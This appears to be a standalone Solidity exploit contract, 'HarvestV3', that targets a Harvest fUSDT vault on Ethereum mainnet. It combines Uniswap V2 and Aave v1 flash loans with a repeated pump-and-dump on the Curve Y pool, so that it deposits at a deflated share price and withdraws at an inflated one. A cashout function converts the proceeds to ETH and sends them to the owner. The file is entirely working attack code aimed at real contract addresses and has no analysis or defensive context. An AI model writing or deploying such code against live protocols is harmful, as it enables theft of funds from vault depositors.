// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

interface ICurveYPool {
    function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 minDy) external;
}
interface IHVault {
    function deposit(uint256 amount) external;
    function withdraw(uint256 shares) external;
    function balanceOf(address) external view returns (uint256);
}
interface IAAVEv1 {
    function flashLoan(address receiver, address reserve, uint256 amount, bytes calldata params) external;
}
interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}
interface IUniswapV2Router {
    function swapExactTokensForETH(uint256,uint256,address[] calldata,address,uint256) external returns (uint256[] memory);
}

contract HarvestV3 {
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    IHVault constant FUSDT = IHVault(0x053c80eA73Dc6941F518a68E2FC52Ac45BDE7c9C);
    ICurveYPool constant CURVE = ICurveYPool(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51);
    IAAVEv1 constant AAVE = IAAVEv1(0x398eC7346DcD622eDc5ae82352F02bE94C62d119);
    address constant AAVE_CORE = 0x3dfd23A6c5E8BbcFc9581d2E864a68feb6a076d3;
    // token0=WETH, token1=USDT
    IUniswapV2Pair constant USDT_WETH = IUniswapV2Pair(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);
    IUniswapV2Router constant ROUTER = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    address payable public immutable owner;
    uint256 _pumpSize; uint256 _dumpSize; uint256 _iters;
    uint256 _aaveUSDCFlash;

    constructor() {
        owner = payable(msg.sender);
        _approve(USDT, address(CURVE)); _approve(USDC, address(CURVE));
        _approve(USDT, address(FUSDT));
        _approve(USDT, address(ROUTER)); _approve(USDC, address(ROUTER));
        _approve(USDC, AAVE_CORE); // for AAVE repay
    }

    /// UniV2 flash USDT (outer) → AAVE flash USDC (inner) → attack
    function exploit(uint256 uniUSDT, uint256 aaveUSDC, uint256 pumpSize, uint256 dumpSize, uint256 iters) external {
        require(msg.sender == owner);
        _pumpSize = pumpSize; _dumpSize = dumpSize; _iters = iters;
        _aaveUSDCFlash = aaveUSDC;
        // Flash borrow USDT from UniV2 (token1)
        USDT_WETH.swap(0, uniUSDT, address(this), hex"01");
    }

    function uniswapV2Call(address, uint256, uint256 amount1, bytes calldata) external {
        require(msg.sender == address(USDT_WETH));
        uint256 usdtOwed = (amount1 * 1000 / 997) + 1;
        // Flash borrow USDC from AAVE (0.09% fee, no USDT liquidity impact)
        AAVE.flashLoan(address(this), USDC, _aaveUSDCFlash, abi.encode(usdtOwed));
        // Repay UniV2 USDT
        _safeTransfer(USDT, address(USDT_WETH), usdtOwed);
    }

    function executeOperation(address, uint256 _amount, uint256 _fee, bytes calldata params) external {
        require(msg.sender == address(AAVE));
        uint256 usdtOwed = abi.decode(params, (uint256));
        uint256 usdcRepay = _amount + _fee;

        // Attack loop
        for (uint256 i = 0; i < _iters; i++) {
            uint256 usdtBefore = _bal(USDT);
            // PUMP: USDC → USDT (yUSDT scarce → oracle DOWN)
            CURVE.exchange_underlying(1, 2, _pumpSize, 0);
            uint256 pumpedUsdt = _bal(USDT) - usdtBefore;
            // DEPOSIT at deflated oracle
            FUSDT.deposit(pumpedUsdt);
            // DUMP: USDT → USDC (yUSDT plentiful → oracle UP)
            CURVE.exchange_underlying(2, 1, _dumpSize, 0);
            // WITHDRAW at inflated oracle
            FUSDT.withdraw(FUSDT.balanceOf(address(this)));
        }

        // Rebalance: convert excess USDT→USDC if needed
        uint256 usdcBal = _bal(USDC);
        if (usdcBal < usdcRepay) {
            uint256 usdtBal = _bal(USDT);
            if (usdtBal > usdtOwed) {
                uint256 excess = usdtBal - usdtOwed;
                uint256 need = usdcRepay - usdcBal;
                uint256 swap = need * 110 / 100; // 10% buffer
                if (swap > excess) swap = excess;
                if (swap > 0) CURVE.exchange_underlying(2, 1, swap, 0);
            }
        }

        // Repay AAVE USDC
        _safeTransfer(USDC, AAVE_CORE, usdcRepay);
    }

    function cashout() external {
        uint256 b = _bal(USDT);
        if (b > 0) { address[] memory p = new address[](2); p[0]=USDT; p[1]=WETH; ROUTER.swapExactTokensForETH(b,0,p,address(this),block.timestamp+3600); }
        b = _bal(USDC);
        if (b > 0) { address[] memory p = new address[](2); p[0]=USDC; p[1]=WETH; ROUTER.swapExactTokensForETH(b,0,p,address(this),block.timestamp+3600); }
        (bool ok,) = owner.call{value: address(this).balance}(""); require(ok);
    }

    receive() external payable {}
    function _bal(address t) internal view returns (uint256) { (bool ok, bytes memory r) = t.staticcall(abi.encodeWithSelector(0x70a08231, address(this))); require(ok); return abi.decode(r, (uint256)); }
    function _safeTransfer(address t, address to, uint256 a) internal { (bool ok, bytes memory r) = t.call(abi.encodeWithSelector(0xa9059cbb, to, a)); require(ok && (r.length == 0 || abi.decode(r, (bool)))); }
    function _approve(address t, address s) internal { t.call(abi.encodeWithSelector(0x095ea7b3, s, uint256(0))); t.call(abi.encodeWithSelector(0x095ea7b3, s, type(uint256).max)); }
}
